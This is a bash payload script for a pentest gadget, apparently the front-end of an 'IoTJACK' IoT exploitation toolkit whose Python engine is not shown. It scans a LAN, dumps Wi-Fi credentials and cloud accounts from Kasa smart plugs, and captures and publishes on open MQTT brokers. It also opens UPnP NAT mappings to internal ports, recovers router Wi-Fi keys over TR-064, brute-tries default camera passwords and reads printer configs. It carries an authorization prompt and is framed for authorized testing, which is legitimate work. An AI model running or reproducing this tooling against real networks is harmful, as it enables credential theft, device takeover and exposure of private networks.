#!/bin/bash
# Title: IoTJACK - IoT Exploitation Toolkit
# Description: Scan a LAN for IoT devices and exploit the classics: Kasa Wi-Fi cred dump, anonymous MQTT capture/publish, UPnP IGD port-punching, TR-064 key recovery, RTSP default creds, PJL printer readout.
# Author: sinXne0
# Version: 1.0.0
# Category: user/interception
# Firmware: 2.0.0-stable or newer
# Requires: python3-light
#
# IoTJACK fingerprints devices on the local network and runs per-protocol
# attack modules against them. Read actions loot information; write actions
# (relay toggle, MQTT publish, IGD mapping add/remove, printer display) are
# individually confirmed on screen before anything is sent.
#
# Modules
#   Kasa    - TP-Link smart plugs/bulbs: sysinfo, Wi-Fi creds (netif
#             get_stainfo), bound cloud account, power meter, relay toggle.
#   MQTT    - anonymous broker probe, wildcard capture, publish.
#   IGD     - UPnP Internet Gateway: external IP, list mappings, add/remove
#             port mappings (tags its own mappings "IoTJACK" for cleanup).
#   TR-064  - router DeviceInfo + WLANConfiguration GetSecurityKeys.
#   RTSP    - camera DESCRIBE with 8 default cred pairs (Basic + Digest).
#   PJL     - port 9100 printers: ID, status, config, filesystem list,
#             display message.
#
# Authorization
#   For authorized security testing only. Run only on networks and devices
#   you own or have written permission to test. Write actions change device
#   state and can open NAT mappings on a gateway.
#
# LED States
#   Cyan solid   - scanning / working
#   Red solid    - write action in progress
#   Green solid  - action succeeded
#   Amber        - nothing found / auth required
#   Red blink    - error
#   White        - idle / cleaned up
#
# Loot
#   /root/loot/iotjack/events.jsonl    every action and result
#   /root/loot/iotjack/ui.log          activity log
#   /root/loot/iotjack/scan_*.json     discovery results
#   /root/loot/iotjack/mqtt_*.jsonl    captured MQTT messages

# === CONFIGURATION ===
LOOTDIR="${IOTJACK_LOOT:-/root/loot/iotjack}"
ENGINE_NAME="iotjack.py"

# === PATHS ===
SCRIPT_SOURCE="${BASH_SOURCE[0]:-$0}"
SCRIPT_DIR="$(cd "$(dirname "$SCRIPT_SOURCE")" 2>/dev/null && pwd)"
PAYLOAD_DIR=""
for candidate in "$SCRIPT_DIR" \
                 "/root/payloads/user/interception/iotjack" \
                 "/mmc/root/payloads/user/interception/iotjack"; do
    if [ -f "$candidate/$ENGINE_NAME" ]; then
        PAYLOAD_DIR="$candidate"
        break
    fi
done

ENGINE="$PAYLOAD_DIR/$ENGINE_NAME"
RUNLOG="/tmp/iotjack_run.log"
SCANFILE="/tmp/iotjack_scan.json"
SCANERR="/tmp/iotjack_scan.err"

# Discovery results (parallel arrays)
SCAN_KIND=()
SCAN_IP=()
SCAN_PORTS=()
SCAN_NAME=()
SCAN_DETAIL=()

# === CLEANUP ===
cleanup() {
    rm -f "$SCANFILE" "$SCANERR" "$RUNLOG"
    LED WHITE 2>/dev/null
}
trap cleanup EXIT INT TERM

# === UI HELPERS ===
confirmed() {
    [ "$1" = "$DUCKYSCRIPT_USER_CONFIRMED" ] || [ "$1" = "true" ]
}

play_start()  { RINGTONE "start:d=4,o=5,b=200:c6,e6,g6" & }
play_done()   { RINGTONE "done:d=4,o=5,b=180:c6,e6,g6,c7" & }
play_fail()   { RINGTONE "fail:d=4,o=4,b=120:g,e,c" & }
play_loot()   { RINGTONE "loot:d=8,o=6,b=220:c7,g6" & }

# === AUTHORIZATION GATE ===
scope_gate() {
    LOG "red" "=========================================="
    LOG "red" "          AUTHORIZED TESTING ONLY"
    LOG "red" "=========================================="
    LOG ""
    LOG "IoTJACK actively exploits IoT devices:"
    LOG "it dumps Wi-Fi credentials from smart"
    LOG "plugs, captures MQTT traffic, tests"
    LOG "default camera passwords, and can open"
    LOG "NAT mappings on gateways."
    LOG ""
    LOG "Use only on networks and devices you"
    LOG "own or have written permission to test."
    LOG ""
    resp=$(CONFIRMATION_DIALOG "I confirm I have written authorization to test this network and its devices.")
    rc=$?
    case $rc in
        "${DUCKYSCRIPT_REJECTED:-__rejected}"|"${DUCKYSCRIPT_ERROR:-__error}")
            return 1
            ;;
    esac
    confirmed "$resp" || return 1
    LOG "green" "Authorization confirmed."
    return 0
}

# === DEPENDENCIES ===
ensure_python() {
    if command -v python3 >/dev/null 2>&1; then
        return 0
    fi

    LOG "yellow" "python3 is not installed."
    resp=$(CONFIRMATION_DIALOG "Install python3-light now? (~3 MB)")
    confirmed "$resp" || return 1

    LOG "cyan" "Updating package lists..."
    opkg update >/dev/null 2>&1
    LOG "cyan" "Installing python3-light..."
    if opkg install python3-light >/tmp/iotjack_opkg.log 2>&1; then
        if command -v python3 >/dev/null 2>&1; then
            LOG "green" "python3-light installed."
            return 0
        fi
    fi

    LOG "red" "Install failed. See /tmp/iotjack_opkg.log"
    ALERT "python3-light install failed.\n\nRun manually:\nopkg update && opkg install python3-light"
    return 1
}

# === INTERFACE PICKER ===
pick_interface() {
    local -a labels
    local name ip pick

    while true; do
        labels=()
        while IFS=$'\t' read -r name ip; do
            [ -z "$name" ] && continue
            labels+=("$name ($ip)")
        done < <(python3 "$ENGINE" ifaces 2>/dev/null)

        if [ ${#labels[@]} -eq 0 ]; then
            ALERT "No interface has an IPv4 address.\n\nConnect to the target network, then retry."
            resp=$(CONFIRMATION_DIALOG "Retry interface scan?")
            confirmed "$resp" || return 1
            continue
        fi

        pick=$(LIST_PICKER "Select interface" "${labels[@]}" "Refresh list")
        [ -z "$pick" ] && return 1
        [ "$pick" = "Refresh list" ] && continue

        IFACE="${pick%% (*}"
        IFACE_IP=$(python3 "$ENGINE" ifaces 2>/dev/null | awk -F'\t' -v n="$IFACE" '$1 == n { print $2; exit }')
        if [ -z "$IFACE_IP" ]; then
            ALERT "Interface $IFACE has no IPv4 address."
            continue
        fi
        return 0
    done
}

# === ENGINE RUNNER ===
run_engine() {
    # Shows engine stdout on screen; returns engine exit code.
    local rc line
    : > "$RUNLOG"
    python3 "$ENGINE" "$@" --loot "$LOOTDIR" > "$RUNLOG" 2>&1
    rc=$?
    while IFS= read -r line; do
        [ -n "$line" ] && LOG "  ${line:0:88}"
    done < "$RUNLOG"
    return $rc
}

# === SCAN ===
load_scan_file() {
    local file="$1"
    local kind sip sports sname sdetail

    SCAN_KIND=(); SCAN_IP=(); SCAN_PORTS=(); SCAN_NAME=(); SCAN_DETAIL=()

    while IFS=$'\t' read -r kind sip sports sname sdetail; do
        [ -z "$kind" ] && continue
        SCAN_KIND+=("$kind")
        SCAN_IP+=("$sip")
        SCAN_PORTS+=("$sports")
        SCAN_NAME+=("$sname")
        SCAN_DETAIL+=("$sdetail")
    done < <(python3 - "$file" <<'PYEOF'
import json
import sys

try:
    with open(sys.argv[1], "r", encoding="utf-8", errors="replace") as f:
        data = json.load(f)
except Exception:
    data = []

for d in data:
    kind = str(d.get("kind", "?"))
    ip = str(d.get("ip", "") or "")
    ports = ",".join(str(p) for p in (d.get("ports") or [])[:10])
    name = " ".join(str(d.get("name") or "").split())[:40]
    detail = " ".join(str(d.get("detail") or "").split())[:40]
    print("\t".join([kind, ip, ports, name, detail]))
PYEOF
)
}

run_scan() {
    local profile spinner rc i total

    profile=$(LIST_PICKER "Scan profile" \
        "Fast - IoT ports only" \
        "Full - 22 ports per host")
    [ -z "$profile" ] && return
    case "$profile" in
        Fast*) profile="fast" ;;
        *) profile="full" ;;
    esac

    mkdir -p "$LOOTDIR"
    : > "$SCANFILE"; : > "$SCANERR"
    LOG ""
    LOG "cyan" "Scanning subnet of $IFACE_IP ($profile)..."
    LED CYAN
    spinner=$(START_SPINNER "Scanning $IFACE_IP/24 ($profile)...")
    python3 "$ENGINE" scan --iface "$IFACE" --loot "$LOOTDIR" \
        --profile "$profile" --json > "$SCANFILE" 2> "$SCANERR"
    rc=$?
    STOP_SPINNER "$spinner" >/dev/null 2>&1

    if [ $rc -ne 0 ]; then
        LED RED
        play_fail
        ALERT "Scan failed.\n\n$(head -n 3 "$SCANERR" 2>/dev/null)"
        return 1
    fi

    load_scan_file "$SCANFILE"
    total=${#SCAN_KIND[@]}
    if [ "$total" -eq 0 ]; then
        LED AMBER
        LOG "yellow" "No devices answered."
        return 1
    fi

    LED GREEN
    play_done
    LOG "green" "Found $total device(s):"
    i=0
    while [ $i -lt $total ] && [ $i -lt 12 ]; do
        LOG "  [${SCAN_KIND[$i]}] ${SCAN_IP[$i]} ${SCAN_NAME[$i]}"
        i=$((i + 1))
    done
    [ $total -gt 12 ] && LOG "  ... $((total - 12)) more in the JSON log"
    LOG "  Saved under $LOOTDIR"
    return 0
}

# === ATTACK: module actions ===
attack_kasa() {
    local target="$1"
    local action state
    while true; do
        action=$(LIST_PICKER "Kasa $target" \
            "Dump Wi-Fi creds" \
            "Device info" \
            "Bound cloud account" \
            "Power meter" \
            "Toggle relay (WRITE)" \
            "Back")
        [ -z "$action" ] && return
        case "$action" in
            "Back") return ;;
            "Dump Wi-Fi creds")
                LED CYAN
                if run_engine kasa --target "$target" --action creds; then
                    LED GREEN; play_loot
                    ALERT "Kasa creds dumped.\n\nLoot: $LOOTDIR"
                else
                    LED AMBER; play_fail
                fi
                ;;
            "Device info")
                LED CYAN
                run_engine kasa --target "$target" --action sysinfo && LED GREEN || LED AMBER
                ;;
            "Bound cloud account")
                LED CYAN
                run_engine kasa --target "$target" --action cloud && LED GREEN || LED AMBER
                ;;
            "Power meter")
                LED CYAN
                run_engine kasa --target "$target" --action emeter && LED GREEN || LED AMBER
                ;;
            "Toggle relay"*)
                resp=$(CONFIRMATION_DIALOG "Toggle the relay on $target?\n\nThis switches the physical device on/off.")
                if confirmed "$resp"; then
                    LED RED
                    if run_engine kasa --target "$target" --action relay --state toggle; then
                        LED GREEN; play_done
                    else
                        LED AMBER; play_fail
                    fi
                fi
                ;;
        esac
    done
}

attack_mqtt() {
    local target="$1"
    local action seconds topic payload
    while true; do
        action=$(LIST_PICKER "MQTT $target" \
            "Probe anonymous access" \
            "Capture messages" \
            "Publish message (WRITE)" \
            "Back")
        [ -z "$action" ] && return
        case "$action" in
            "Back") return ;;
            "Probe"*)
                LED CYAN
                run_engine mqtt --target "$target" --action probe && LED GREEN || LED AMBER
                ;;
            "Capture"*)
                seconds=$(NUMBER_PICKER "Capture seconds (5-120)" "30")
                case $? in
                    "${DUCKYSCRIPT_CANCELLED:-__cancelled}"|"${DUCKYSCRIPT_REJECTED:-__rejected}"|"${DUCKYSCRIPT_ERROR:-__error}")
                        continue ;;
                esac
                case "$seconds" in ''|*[!0-9]*) seconds=30 ;; esac
                [ "$seconds" -lt 5 ] && seconds=5
                [ "$seconds" -gt 120 ] && seconds=120
                LED CYAN
                play_start
                if run_engine mqtt --target "$target" --action capture --seconds "$seconds"; then
                    LED GREEN; play_loot
                    ALERT "MQTT capture done.\n\nMessages: see mqtt_*.jsonl in $LOOTDIR"
                else
                    LED AMBER; play_fail
                fi
                ;;
            "Publish"*)
                topic=$(TEXT_PICKER "Topic" "home/test")
                [ -z "$topic" ] && continue
                payload=$(TEXT_PICKER "Payload" "ON")
                resp=$(CONFIRMATION_DIALOG "Publish to $target?\n\nTopic: $topic\nPayload: $payload\n\nThis can actuate devices.")
                if confirmed "$resp"; then
                    LED RED
                    if run_engine mqtt --target "$target" --action publish --topic "$topic" --payload "$payload"; then
                        LED GREEN; play_done
                    else
                        LED AMBER; play_fail
                    fi
                fi
                ;;
        esac
    done
}

attack_igd() {
    local target="$1"
    local action extport intport client proto
    while true; do
        action=$(LIST_PICKER "IGD $target" \
            "Show external IP + mappings" \
            "Add port mapping (WRITE)" \
            "Remove a mapping (WRITE)" \
            "Back")
        [ -z "$action" ] && return
        case "$action" in
            "Back") return ;;
            "Show"*)
                LED CYAN
                if run_engine igd --target "$target" --iface "$IFACE" --action enum; then
                    LED GREEN; play_loot
                else
                    LED AMBER; play_fail
                    LOG "yellow" "No IGD answer from $target."
                fi
                ;;
            "Add"*)
                extport=$(NUMBER_PICKER "External port" "2323")
                [ -z "$extport" ] && continue
                intport=$(NUMBER_PICKER "Internal port" "23")
                [ -z "$intport" ] && continue
                client=$(IP_PICKER "Forward to internal IP" "$IFACE_IP")
                [ -z "$client" ] && continue
                proto=$(LIST_PICKER "Protocol" "tcp" "udp")
                [ -z "$proto" ] && continue
                resp=$(CONFIRMATION_DIALOG "Open NAT mapping on $target?\n\n$proto $extport -> $client:$intport\n\nTagged 'IoTJACK' for removal.")
                if confirmed "$resp"; then
                    LED RED
                    if run_engine igd --target "$target" --iface "$IFACE" \
                        --action map --ext-port "$extport" --int-port "$intport" \
                        --internal-ip "$client" --proto "$proto" --desc "audit"; then
                        LED GREEN; play_done
                        LOG "green" "Mapping added. Remove it when done!"
                    else
                        LED AMBER; play_fail
                    fi
                fi
                ;;
            "Remove"*)
                extport=$(NUMBER_PICKER "External port to remove" "2323")
                [ -z "$extport" ] && continue
                proto=$(LIST_PICKER "Protocol" "tcp" "udp")
                [ -z "$proto" ] && continue
                resp=$(CONFIRMATION_DIALOG "Remove mapping $proto/$extport on $target?")
                if confirmed "$resp"; then
                    LED RED
                    if run_engine igd --target "$target" --iface "$IFACE" \
                        --action unmap --ext-port "$extport" --proto "$proto"; then
                        LED GREEN; play_done
                    else
                        LED AMBER; play_fail
                    fi
                fi
                ;;
        esac
    done
}

attack_tr064() {
    local target="$1"
    LED CYAN
    LOG "cyan" "Pulling TR-064 info + Wi-Fi keys from $target..."
    if run_engine tr064 --target "$target"; then
        LED GREEN; play_loot
        ALERT "TR-064 data captured.\n\nLoot: $LOOTDIR"
    else
        LED AMBER; play_fail
        LOG "yellow" "No TR-064 data (auth required or unsupported)."
    fi
}

attack_rtsp() {
    local target="$1"
    LED CYAN
    LOG "cyan" "Testing default RTSP creds on $target..."
    if run_engine rtsp --target "$target"; then
        LED GREEN; play_loot
        ALERT "RTSP creds worked!\n\nSee output above and loot in $LOOTDIR"
    else
        LED AMBER; play_fail
        LOG "yellow" "No default creds worked."
    fi
}

attack_pjl() {
    local target="$1"
    local action msg
    while true; do
        action=$(LIST_PICKER "PJL $target" \
            "Identify printer" \
            "Status" \
            "Config (may contain creds)" \
            "List stored files" \
            "Display message (WRITE)" \
            "Back")
        [ -z "$action" ] && return
        case "$action" in
            "Back") return ;;
            "Identify"*)
                LED CYAN
                run_engine pjl --target "$target" --action id && LED GREEN || LED AMBER ;;
            "Status")
                LED CYAN
                run_engine pjl --target "$target" --action status && LED GREEN || LED AMBER ;;
            "Config"*)
                LED CYAN
                if run_engine pjl --target "$target" --action config; then
                    LED GREEN; play_loot
                else
                    LED AMBER
                fi ;;
            "List"*)
                LED CYAN
                run_engine pjl --target "$target" --action ls && LED GREEN || LED AMBER ;;
            "Display"*)
                msg=$(TEXT_PICKER "Display message" "READY")
                [ -z "$msg" ] && continue
                resp=$(CONFIRMATION_DIALOG "Show '$msg' on the printer display at $target?")
                if confirmed "$resp"; then
                    LED RED
                    run_engine pjl --target "$target" --action display --message "$msg" && LED GREEN || LED AMBER
                fi
                ;;
        esac
    done
}

# === ATTACK: target/module routing ===
suggest_modules() {
    local kind="$1"
    case "$kind" in
        kasa)    echo "kasa" ;;
        mqtt)    echo "mqtt" ;;
        router)  echo "tr064 igd" ;;
        camera)  echo "rtsp" ;;
        printer) echo "pjl" ;;
        *)       echo "" ;;
    esac
}

attack_device() {
    local target="$1" kind="$2"
    local suggested pick
    suggested=$(suggest_modules "$kind")

    while true; do
        local -a opts
        opts=()
        for m in $suggested; do
            case "$m" in
                kasa)   opts+=("Kasa attack (suggested)") ;;
                mqtt)   opts+=("MQTT attack (suggested)") ;;
                tr064)  opts+=("TR-064 keys (suggested)") ;;
                igd)    opts+=("IGD mappings (suggested)") ;;
                rtsp)   opts+=("RTSP creds (suggested)") ;;
                pjl)    opts+=("PJL printer (suggested)") ;;
            esac
        done
        opts+=("Kasa attack" "MQTT attack" "IGD mappings" "TR-064 keys" "RTSP creds" "PJL printer" "Back")

        pick=$(LIST_PICKER "Module for $target" "${opts[@]}")
        [ -z "$pick" ] && return
        case "$pick" in
            "Back") return ;;
            "Kasa"*)   attack_kasa "$target" ;;
            "MQTT"*)   attack_mqtt "$target" ;;
            "IGD"*)    attack_igd "$target" ;;
            "TR-064"*) attack_tr064 "$target" ;;
            "RTSP"*)   attack_rtsp "$target" ;;
            "PJL"*)    attack_pjl "$target" ;;
        esac
    done
}

pick_target() {
    local i=0 total=${#SCAN_KIND[@]}
    local -a labels
    local pick num kind

    labels=()
    while [ $i -lt $total ] && [ $i -lt 18 ]; do
        labels+=("$((i + 1)). [${SCAN_KIND[$i]}] ${SCAN_IP[$i]} ${SCAN_NAME[$i]}")
        i=$((i + 1))
    done
    labels+=("Enter IP manually" "Run scan first" "Back")

    pick=$(LIST_PICKER "Attack which device?" "${labels[@]}")
    [ -z "$pick" ] && return
    case "$pick" in
        "Back") return ;;
        "Run scan first") run_scan; return ;;
        "Enter IP manually")
            pick=$(IP_PICKER "Target IP" "")
            [ -z "$pick" ] && return
            attack_device "$pick" "manual"
            return
            ;;
    esac

    num="${pick%%.*}"
    case "$num" in ''|*[!0-9]*) return ;; esac
    num=$((num - 1))
    [ "$num" -lt 0 ] || [ "$num" -ge "$total" ] && return
    attack_device "${SCAN_IP[$num]}" "${SCAN_KIND[$num]}"
}

# === QUICK WINS ===
quick_kasa_creds() {
    local i=0 hits=0
    while [ $i -lt ${#SCAN_KIND[@]} ]; do
        if [ "${SCAN_KIND[$i]}" = "kasa" ]; then
            hits=$((hits + 1))
            LOG "cyan" "Kasa creds: ${SCAN_IP[$i]} (${SCAN_NAME[$i]})"
            LED CYAN
            run_engine kasa --target "${SCAN_IP[$i]}" --action creds && play_loot
        fi
        i=$((i + 1))
    done
    if [ $hits -eq 0 ]; then
        LED AMBER
        LOG "yellow" "No Kasa devices in the last scan."
    else
        LED GREEN
        ALERT "Kasa cred dump complete.\n\n$hits device(s) tried.\nLoot: $LOOTDIR"
    fi
}

quick_mqtt_capture() {
    local seconds i=0 hits=0
    seconds=$(NUMBER_PICKER "Capture seconds (5-120)" "30")
    case $? in
        "${DUCKYSCRIPT_CANCELLED:-__cancelled}"|"${DUCKYSCRIPT_REJECTED:-__rejected}"|"${DUCKYSCRIPT_ERROR:-__error}")
            return ;;
    esac
    case "$seconds" in ''|*[!0-9]*) seconds=30 ;; esac
    [ "$seconds" -lt 5 ] && seconds=5
    [ "$seconds" -gt 120 ] && seconds=120
    while [ $i -lt ${#SCAN_KIND[@]} ]; do
        if [ "${SCAN_KIND[$i]}" = "mqtt" ]; then
            hits=$((hits + 1))
            LOG "cyan" "MQTT capture: ${SCAN_IP[$i]} for ${seconds}s"
            LED CYAN
            run_engine mqtt --target "${SCAN_IP[$i]}" --action capture --seconds "$seconds" && play_loot
        fi
        i=$((i + 1))
    done
    if [ $hits -eq 0 ]; then
        LED AMBER
        LOG "yellow" "No open MQTT brokers in the last scan."
    else
        LED GREEN
        ALERT "MQTT capture complete.\n\n$hits broker(s).\nLoot: $LOOTDIR"
    fi
}

quick_rtsp_creds() {
    local i=0 hits=0
    while [ $i -lt ${#SCAN_KIND[@]} ]; do
        if [ "${SCAN_KIND[$i]}" = "camera" ]; then
            hits=$((hits + 1))
            LOG "cyan" "RTSP creds: ${SCAN_IP[$i]} (${SCAN_NAME[$i]})"
            LED CYAN
            run_engine rtsp --target "${SCAN_IP[$i]}" && play_loot
        fi
        i=$((i + 1))
    done
    if [ $hits -eq 0 ]; then
        LED AMBER
        LOG "yellow" "No cameras in the last scan."
    else
        LED GREEN
        ALERT "RTSP audit complete.\n\n$hits device(s) tried.\nLoot: $LOOTDIR"
    fi
}

run_quick() {
    local pick
    if [ ${#SCAN_KIND[@]} -eq 0 ]; then
        LOG "yellow" "Run a scan first."
        resp=$(CONFIRMATION_DIALOG "No scan results yet. Scan now?")
        if confirmed "$resp"; then
            run_scan
        fi
        [ ${#SCAN_KIND[@]} -eq 0 ] && return
    fi
    pick=$(LIST_PICKER "Quick wins" \
        "Kasa: dump Wi-Fi creds (all)" \
        "MQTT: capture from open brokers" \
        "RTSP: test default creds (all)" \
        "Back")
    [ -z "$pick" ] && return
    case "$pick" in
        "Kasa"*) quick_kasa_creds ;;
        "MQTT"*) quick_mqtt_capture ;;
        "RTSP"*) quick_rtsp_creds ;;
    esac
}

# === ABOUT ===
show_about() {
    LOG ""
    LOG "cyan" "IoTJACK v1.0.0"
    LOG ""
    LOG "IoT exploitation toolkit. Modules:"
    LOG "  Kasa   - Wi-Fi creds, cloud account,"
    LOG "           power meter, relay toggle"
    LOG "  MQTT   - anon probe, capture, publish"
    LOG "  IGD    - list/add/remove NAT mappings"
    LOG "  TR-064 - gateway Wi-Fi key recovery"
    LOG "  RTSP   - camera default-cred audit"
    LOG "  PJL    - printer ID/config/files/LCD"
    LOG ""
    LOG "Read actions loot data. WRITE actions"
    LOG "ask before sending. IGD mappings are"
    LOG "tagged 'IoTJACK' so you can remove"
    LOG "them when the engagement ends."
    LOG ""
    LOG "Loot: $LOOTDIR"
    LOG ""
    LOG "red" "AUTHORIZED TESTING ONLY"
    LOG ""
    WAIT_FOR_INPUT
}

# === MAIN ===
LED WHITE 2>/dev/null
LOG ""
LOG "cyan" "=============================================="
LOG "cyan" "  IoTJACK - IoT Exploitation Toolkit v1.0.0"
LOG "cyan" "=============================================="
LOG ""

if ! scope_gate; then
    LOG "yellow" "Authorization not confirmed. Exiting."
    LED WHITE 2>/dev/null
    exit 1
fi

if [ -z "$PAYLOAD_DIR" ] || [ ! -f "$ENGINE" ]; then
    LED RED 2>/dev/null
    ALERT "iotjack.py not found.\n\nExpected next to payload.sh or in /root/payloads/user/interception/iotjack"
    exit 1
fi

if ! ensure_python; then
    LED RED 2>/dev/null
    exit 1
fi

if ! pick_interface; then
    LOG "yellow" "No interface selected. Exiting."
    LED WHITE 2>/dev/null
    exit 1
fi

LOG "green" "Interface: $IFACE ($IFACE_IP)"
mkdir -p "$LOOTDIR"

while true; do
    choice=$(LIST_PICKER "IoTJACK" \
        "Scan network" \
        "Attack a device" \
        "Quick wins" \
        "About / safety" \
        "Exit")

    [ -z "$choice" ] && break

    case "$choice" in
        "Scan"*)   run_scan ;;
        "Attack"*) pick_target ;;
        "Quick"*)  run_quick ;;
        "About"*)  show_about ;;
        "Exit")    break ;;
        *)         LOG "yellow" "Unknown selection: $choice" ;;
    esac
    LED WHITE 2>/dev/null
done

LOG ""
LOG "green" "IoTJACK exiting."
LED WHITE 2>/dev/null
exit 0
